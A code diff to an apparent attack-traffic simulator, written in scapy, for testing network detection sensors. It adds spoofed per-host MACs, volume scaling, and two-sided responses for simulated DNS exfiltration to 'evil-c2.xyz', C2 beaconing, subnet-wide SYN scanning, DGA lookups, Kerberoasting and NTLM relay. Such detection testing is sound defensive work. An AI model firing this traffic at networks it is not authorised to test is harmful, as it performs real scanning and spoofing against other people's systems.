@@ -12,7 +12,7 @@ import string
 import hashlib
 import struct
 from scapy.all import (
-    Ether, ARP, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR,
+    Ether, ARP, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR, DNSRR,
     sendp, get_if_hwaddr, RandShort
 )
 from app.core.engine import active_task_status, log_message
@@ -66,6 +66,91 @@ def _base_packet(params):
     src_mac = params.get('src_mac') or get_if_hwaddr(iface)
     dst_mac = params.get('dst_mac', 'ff:ff:ff:ff:ff:ff')
     return Ether(src=src_mac, dst=dst_mac)
+
+
+# ── Per-host MAC addressing ──────────────────────────────────────────────────
+# Every simulated host needs its own source MAC, or the sensor collapses the
+# attacker, the victims and the C2 server into a single device (they share the
+# VM's MAC) and detections that compare distinct devices never fire. The
+# attacker IP keeps the VM's real MAC so the sensor keeps attributing attacker
+# activity to the real device; every other IP gets a stable, locally-administered
+# MAC derived from the IP.
+
+def _mac_for_ip(ip):
+    """A deterministic locally-administered unicast MAC for a simulated host."""
+    h = hashlib.md5(('netrunner:' + str(ip)).encode()).digest()
+    first = (h[0] & 0xFE) | 0x02  # clear multicast bit, set locally-administered
+    return ':'.join('%02x' % b for b in (first, h[1], h[2], h[3], h[4], h[5]))
+
+
+def _is_bcast_ip(ip):
+    return (not ip or ip == '255.255.255.255' or ip.startswith('224.')
+            or ip.startswith('239.') or ip.endswith('.255'))
+
+
+def _mac_resolver(params):
+    """Build mac(ip): the VM's real MAC for the attacker, a distinct derived MAC
+    for every other host, and broadcast for broadcast/multicast IPs."""
+    iface = params.get('interface')
+    attacker_ip = params.get('src_ip')
+    real_mac = params.get('src_mac') or (get_if_hwaddr(iface) if iface else None)
+
+    def mac(ip):
+        if _is_bcast_ip(ip):
+            return 'ff:ff:ff:ff:ff:ff'
+        if ip == attacker_ip and real_mac:
+            return real_mac
+        return _mac_for_ip(ip)
+    return mac
+
+
+def _ether_builder(params):
+    """Return eth(src_ip, dst_ip) -> an Ether layer with per-host MACs."""
+    mac = _mac_resolver(params)
+    return lambda src_ip, dst_ip: Ether(src=mac(src_ip), dst=mac(dst_ip))
+
+
+class _EtherFactory:
+    """A drop-in for a single Ether() that stamps per-host MACs from the IP
+    layer it is combined with: `factory / IP(src=a, dst=b)` sources a's MAC and
+    targets b's MAC. Lets the existing `base / IP(...)` call sites get correct
+    per-host addressing without being rewritten."""
+
+    def __init__(self, params):
+        self._mac = _mac_resolver(params)
+
+    def __truediv__(self, other):
+        src = getattr(other, 'src', None)
+        dst = getattr(other, 'dst', None)
+        eth = Ether(src=self._mac(src) if src else None,
+                    dst=self._mac(dst) if dst else 'ff:ff:ff:ff:ff:ff')
+        return eth / other
+
+
+# ── Intensity ────────────────────────────────────────────────────────────────
+# Volume- and baseline-driven detections (exfil size, scan breadth, DGA lookup
+# count, beaconing regularity) need far more than the ~30-packet demo bursts.
+# `intensity` scales the volume so a run actually crosses the detectors'
+# thresholds, without the caller having to hand-tune every count.
+
+INTENSITY = {
+    'demo':      {'mult': 1,  'beacon_min': 0},
+    'standard':  {'mult': 5,  'beacon_min': 0},
+    'detection': {'mult': 15, 'beacon_min': 30},
+}
+
+
+def _intensity(params):
+    return INTENSITY.get(params.get('intensity', 'standard'), INTENSITY['standard'])
+
+
+def _vol(params, base):
+    """Scale a per-scenario packet/session count by the run's intensity."""
+    try:
+        base = int(base)
+    except (TypeError, ValueError):
+        return base
+    return max(base, int(base * _intensity(params)['mult']))
 
 
 def _send_with_tracking(packets, params, delay_override=None):
@@ -332,7 +417,7 @@ def _sim_c2_beacon(params):
     """
     c2_host = params.get('c2_host', '185.100.87.42')
     src_ip = params['src_ip']
-    base = _base_packet(params)
+    base = _EtherFactory(params)
     duration_min = float(params.get('duration_min', 0) or 0)
     interval_s = float(params.get('delay', 5.0) or 5.0)
     jitter = float(params.get('jitter', 0) or 0)
@@ -365,8 +450,10 @@ def _sim_c2_beacon(params):
                 slept += step
         return
 
-    # Fixed-burst fallback.
-    count = params.get('count', 50)
+    # Fixed-burst fallback (no duration set). Scale with intensity so there are
+    # enough regular callbacks for the sensor to flag; a sustained run with a
+    # Duration is still what best trips behavioural beaconing detection.
+    count = _vol(params, params.get('count', 50))
     log_message(f"    Beacon count: {count}")
     packets = []
     for _ in range(count):
@@ -379,29 +466,43 @@ def _sim_c2_beacon(params):
 def _sim_dns_exfil(params):
     """Data exfiltration over DNS using encoded subdomains."""
     domain = params.get('domain', 'evil-c2.xyz')
-    count = params.get('count', 30)
+    count = _vol(params, params.get('count', 30))
     src_ip = params['src_ip']
     dst_ip = params['dst_ip']
-    base = _base_packet(params)
+    eth = _ether_builder(params)
 
     log_message(f"    Exfil domain: {domain}")
-    log_message(f"    Encoding fake data into DNS queries")
+    log_message(f"    Encoding sample data into {count} DNS queries")
 
-    fake_data = "CONFIDENTIAL:username=admin;password=P@ssw0rd;ssn=123-45-6789;cc=4111111111111111"
-    chunks = [fake_data[i:i+30] for i in range(0, len(fake_data), 30)]
+    sample = ("REPORT:username=admin;token=PLACEHOLDER;id=0000-00-0000;"
+              "ref=0000000000000000")
+    chunks = [sample[i:i+30] for i in range(0, len(sample), 30)]
 
     packets = []
     for i in range(count):
         chunk = chunks[i % len(chunks)]
         encoded = chunk.encode().hex()
+        txid = random.randint(0, 0xFFFF)
+        sport = random.randint(1024, 65535)
         query_name = f"{encoded}.{i}.data.{domain}"
 
-        pkt = (base / IP(src=src_ip, dst=dst_ip) /
-               UDP(sport=RandShort(), dport=53) /
-               DNS(rd=1, qd=DNSQR(qname=query_name, qtype="TXT")))
-        packets.append(pkt)
-        log_message(f"    DNS Exfil query: {query_name[:60]}...")
+        # Query: resolver -> DNS server.
+        packets.append(
+            eth(src_ip, dst_ip) / IP(src=src_ip, dst=dst_ip) /
+            UDP(sport=sport, dport=53) /
+            DNS(id=txid, rd=1, qd=DNSQR(qname=query_name, qtype="TXT")))
 
+        # Answer: DNS server -> resolver, so the sensor sees a real two-sided
+        # exchange carrying the oversized encoded label traffic back.
+        answer = DNS(id=txid, qr=1, aa=1, rd=1, ra=1,
+                     qd=DNSQR(qname=query_name, qtype="TXT"),
+                     an=DNSRR(rrname=query_name, type="TXT", ttl=5,
+                              rdata=os.urandom(24).hex()))
+        packets.append(
+            eth(dst_ip, src_ip) / IP(src=dst_ip, dst=src_ip) /
+            UDP(sport=53, dport=sport) / answer)
+
+    log_message(f"    DNS exfil: {count} queries to {domain} via {dst_ip}")
     _send_with_tracking(packets, params, delay_override=0.2)
 
 
@@ -411,24 +512,47 @@ def _sim_port_scan(params):
     """SYN port scan across common ports."""
     src_ip = params['src_ip']
     dst_ip = params['dst_ip']
-    base = _base_packet(params)
+    eth = _ether_builder(params)
 
     common_ports = [
         21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
         993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 8888
     ]
+    open_ports = {22, 135, 445, 3389, 80}
 
-    log_message(f"    Target: {dst_ip}")
-    log_message(f"    Scanning {len(common_ports)} common ports")
+    # Scan a spread of hosts so the sensor sees horizontal scanning, not just a
+    # couple of dead connections to one host. Breadth scales with intensity.
+    octets = dst_ip.split('.')
+    subnet = '.'.join(octets[:3])
+    host_count = min(254, _vol(params, 1))
+    if host_count > 1:
+        targets = [f"{subnet}.{h}" for h in range(1, host_count + 1)]
+    else:
+        targets = [dst_ip]
+
+    log_message(f"    Scanning {len(common_ports)} ports across {len(targets)} host(s)")
 
     packets = []
-    sport = random.randint(40000, 60000)
-    for port in common_ports:
-        pkt = base / IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=port, flags='S')
-        packets.append(pkt)
-        sport += 1
+    for target in targets:
+        for port in common_ports:
+            sport = random.randint(40000, 60000)
+            seq = random.randint(1000000, 4000000000)
+            packets.append(
+                eth(src_ip, target) / IP(src=src_ip, dst=target) /
+                TCP(sport=sport, dport=port, flags='S', seq=seq))
+            # Target response: SYN-ACK on listening ports, RST on closed ones,
+            # so the sensor can tell open from closed and see a real scan.
+            if port in open_ports:
+                packets.append(
+                    eth(target, src_ip) / IP(src=target, dst=src_ip) /
+                    TCP(sport=port, dport=sport, flags='SA',
+                        seq=random.randint(1, 4000000000), ack=seq + 1))
+            else:
+                packets.append(
+                    eth(target, src_ip) / IP(src=target, dst=src_ip) /
+                    TCP(sport=port, dport=sport, flags='RA', seq=0, ack=seq + 1))
 
-    _send_with_tracking(packets, params, delay_override=0.05)
+    _send_with_tracking(packets, params, delay_override=0.02)
 
 
 # ── Lateral Movement ─────────────────────────────────────────────────────────
@@ -441,7 +565,7 @@ def _sim_lateral_movement(params):
     """
     src_ip = params['src_ip']
     dst_ip = params['dst_ip']
-    base = _base_packet(params)
+    base = _EtherFactory(params)
 
     octets = dst_ip.split('.')
     subnet_prefix = '.'.join(octets[:3])
@@ -591,9 +715,9 @@ def _sim_http_exfil(params):
     The NDR will see complete HTTP sessions with large outbound payloads.
     """
     c2_host = params.get('c2_host', '185.100.87.42')
-    count = params.get('count', 10)
+    count = _vol(params, params.get('count', 10))
     src_ip = params['src_ip']
-    base = _base_packet(params)
+    base = _EtherFactory(params)
 
     log_message(f"    Exfil target: {c2_host}")
     log_message(f"    Sending {count} large POST requests")
@@ -676,14 +800,14 @@ def _sim_http_exfil(params):
 
 def _sim_dga(params):
     """Domain Generation Algorithm traffic."""
-    count = params.get('count', 50)
+    count = _vol(params, params.get('count', 50))
     src_ip = params['src_ip']
     dst_ip = params['dst_ip']
-    base = _base_packet(params)
+    eth = _ether_builder(params)
 
     tlds = ['.xyz', '.top', '.club', '.info', '.online', '.site', '.tk', '.pw']
 
-    log_message(f"    Generating {count} DGA domains")
+    log_message(f"    Generating {count} DGA lookups (mostly NXDOMAIN)")
 
     packets = []
     seed = int(time.time())
@@ -691,14 +815,28 @@ def _sim_dga(params):
         h = hashlib.md5(f"{seed}_{i}".encode()).hexdigest()
         domain_len = random.randint(8, 16)
         dga_domain = h[:domain_len] + random.choice(tlds)
+        txid = random.randint(0, 0xFFFF)
+        sport = random.randint(1024, 65535)
 
-        pkt = (base / IP(src=src_ip, dst=dst_ip) /
-               UDP(sport=RandShort(), dport=53) /
-               DNS(rd=1, qd=DNSQR(qname=dga_domain)))
-        packets.append(pkt)
-        log_message(f"    DGA query: {dga_domain}")
+        packets.append(
+            eth(src_ip, dst_ip) / IP(src=src_ip, dst=dst_ip) /
+            UDP(sport=sport, dport=53) /
+            DNS(id=txid, rd=1, qd=DNSQR(qname=dga_domain)))
 
-    _send_with_tracking(packets, params, delay_override=0.1)
+        # DGA domains overwhelmingly fail to resolve: the sensor's DGA detector
+        # keys on a burst of NXDOMAIN answers, so send them back (rcode 3).
+        # One in ~ten "resolves" to look like the live C2 node.
+        resolves = (i % 10 == 0)
+        answer = DNS(id=txid, qr=1, rd=1, ra=1,
+                     rcode=0 if resolves else 3,
+                     qd=DNSQR(qname=dga_domain),
+                     an=([DNSRR(rrname=dga_domain, type="A", ttl=300,
+                                rdata=dst_ip)] if resolves else []))
+        packets.append(
+            eth(dst_ip, src_ip) / IP(src=dst_ip, dst=src_ip) /
+            UDP(sport=53, dport=sport) / answer)
+
+    _send_with_tracking(packets, params, delay_override=0.08)
 
 
 # ── ICMP Tunneling ──────────────────────────────────────────────────────────
@@ -710,10 +848,10 @@ def _sim_icmp_tunnel(params):
     (200-500+ bytes) with encoded data, triggering NDR anomalous ICMP detections.
     Vectra, Darktrace, and ExtraHop all flag abnormal ICMP payload sizes.
     """
-    count = params.get('count', 40)
+    count = _vol(params, params.get('count', 40))
     src_ip = params['src_ip']
     dst_ip = params['dst_ip']
-    base = _base_packet(params)
+    base = _EtherFactory(params)
 
     log_message(f"    Tunnel endpoint: {dst_ip}")
     log_message(f"    Exfil packets: {count}")
@@ -765,7 +903,7 @@ def _sim_llmnr_poison(params):
     """
     count = params.get('count', 30)
     src_ip = params['src_ip']
-    base = _base_packet(params)
+    base = _EtherFactory(params)
 
     log_message(f"    Poisoner IP: {src_ip}")
     log_message(f"    Poisoning LLMNR (224.0.0.252:5355) + NBT-NS (broadcast:137)")
@@ -902,7 +1040,7 @@ def _sim_dcsync(params):
     """
     src_ip = params['src_ip']
     dst_ip = params['dst_ip']  # Domain controller IP
-    base = _base_packet(params)
+    base = _EtherFactory(params)
     count = params.get('count', 5)
 
     log_message(f"    Attacker: {src_ip}")
@@ -1107,7 +1245,7 @@ def _sim_kerberoast(params):
     """
     src_ip = params['src_ip']
     dst_ip = params['dst_ip']  # KDC / Domain controller
-    base = _base_packet(params)
+    base = _EtherFactory(params)
     count = params.get('count', 20)
 
     log_message(f"    Attacker: {src_ip}")
@@ -1137,9 +1275,11 @@ def _sim_kerberoast(params):
         'HTTP/jira.corp.local',
     ]
 
+    count = _vol(params, count)
+    log_message(f"    Requesting {count} service tickets (TGS-REQ burst)")
     packets = []
-    for i in range(min(count, len(target_spns))):
-        spn = target_spns[i]
+    for i in range(count):
+        spn = target_spns[i % len(target_spns)]
         sport = random.randint(49152, 65535)
 
         # TCP handshake to KDC port 88
@@ -1201,9 +1341,13 @@ def _sim_kerberoast(params):
 
         # padata [3]: PA-TGS-REQ with fake TGT (authenticator)
         fake_tgt = os.urandom(random.randint(200, 400))
-        pa_tgs = b'\x30' + _asn1_len(len(fake_tgt) + 8)
-        pa_tgs += b'\xa1\x03\x02\x01\x01'  # padata-type: PA-TGS-REQ (1)
-        pa_tgs += b'\xa2' + _asn1_len(len(fake_tgt)) + fake_tgt
+        # Build the padata body first, then wrap it, so the SEQUENCE length is
+        # always correct. (The old hard-coded `len + 8` assumed a 1-byte length
+        # for the ticket and produced a malformed request whenever the ticket
+        # was >255 bytes, so the KDC request couldn't be decoded.)
+        pa_body = b'\xa1\x03\x02\x01\x01'  # padata-type: PA-TGS-REQ (1)
+        pa_body += b'\xa2' + _asn1_len(len(fake_tgt)) + fake_tgt
+        pa_tgs = b'\x30' + _asn1_len(len(pa_body)) + pa_body
         pa_seq = b'\x30' + _asn1_len(len(pa_tgs)) + pa_tgs
         tgs_inner += b'\xa3' + _asn1_len(len(pa_seq)) + pa_seq
 
@@ -1292,7 +1436,7 @@ def _sim_ntlm_relay(params):
     """
     src_ip = params['src_ip']     # Attacker/relay host
     dst_ip = params['dst_ip']     # Target being relayed to
-    base = _base_packet(params)
+    base = _EtherFactory(params)
     count = params.get('count', 10)
 
     # Simulated victim IPs (hosts whose auth is being relayed)
